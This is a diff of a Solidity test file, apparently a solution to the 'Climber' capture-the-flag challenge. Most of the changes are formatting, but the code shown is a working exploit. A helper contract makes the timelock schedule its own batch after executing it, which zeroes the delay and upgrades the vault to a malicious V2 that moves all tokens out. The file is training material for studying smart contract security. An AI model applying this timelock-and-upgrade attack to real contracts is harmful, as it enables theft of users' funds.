@@ -16,7 +16,6 @@ import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Ini
 import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
 import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "../../src/climber/ClimberConstants.sol";
 
-
 contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
     uint256 private _lastWithdrawalTimestamp;
     address private _sweeper;
@@ -88,9 +87,9 @@ contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
         IERC20(token).transfer(recovery, amount);
     }
 }
-    // function version() external pure returns (uint256) {
-    //     return 2;
-    // }
+// function version() external pure returns (uint256) {
+//     return 2;
+// }
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -172,13 +171,12 @@ contract ClimberChallenge is Test {
         ClimberVaultV2 vaultV2 = new ClimberVaultV2();
         HelperContract helper = new HelperContract(timelock);
 
-        bytes memory data =
-            abi.encodeCall(ClimberVaultV2.moveFunds, (address(token), VAULT_TOKEN_BALANCE, recovery));
+        bytes memory data = abi.encodeCall(ClimberVaultV2.moveFunds, (address(token), VAULT_TOKEN_BALANCE, recovery));
 
         address[] memory scheduleTargets = new address[](4);
         uint256[] memory scheduleValues = new uint256[](4);
         bytes[] memory scheduleDataElements = new bytes[](4);
-         
+
         scheduleTargets[0] = address(timelock);
         scheduleValues[0] = 0;
         scheduleDataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, (0));
@@ -190,13 +188,13 @@ contract ClimberChallenge is Test {
         scheduleTargets[2] = address(vault);
         scheduleValues[2] = 0;
         scheduleDataElements[2] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(vaultV2), data));
-        
+
         scheduleTargets[3] = address(helper);
         scheduleValues[3] = 0;
         scheduleDataElements[3] = abi.encodeCall(HelperContract.callSchedule, ());
-        
+
         helper.setSchedule(scheduleTargets, scheduleDataElements);
-        
+
         timelock.execute(scheduleTargets, scheduleValues, scheduleDataElements, 0);
     }
 
@@ -212,16 +210,17 @@ contract ClimberChallenge is Test {
 contract HelperContract {
     address[] private s_targets;
     bytes[] private s_dataElements;
-    ClimberTimelock immutable i_timelock ;
+    ClimberTimelock immutable i_timelock;
 
-    constructor(ClimberTimelock timelock){
+    constructor(ClimberTimelock timelock) {
         i_timelock = timelock;
     }
-    
-    function setSchedule(address[] memory _targets, bytes[] memory _dataElements)external {
+
+    function setSchedule(address[] memory _targets, bytes[] memory _dataElements) external {
         s_targets = _targets;
         s_dataElements = _dataElements;
     }
+
     function callSchedule() external {
         uint256[] memory _values = new uint256[](s_targets.length);
         i_timelock.schedule(s_targets, _values, s_dataElements, 0);
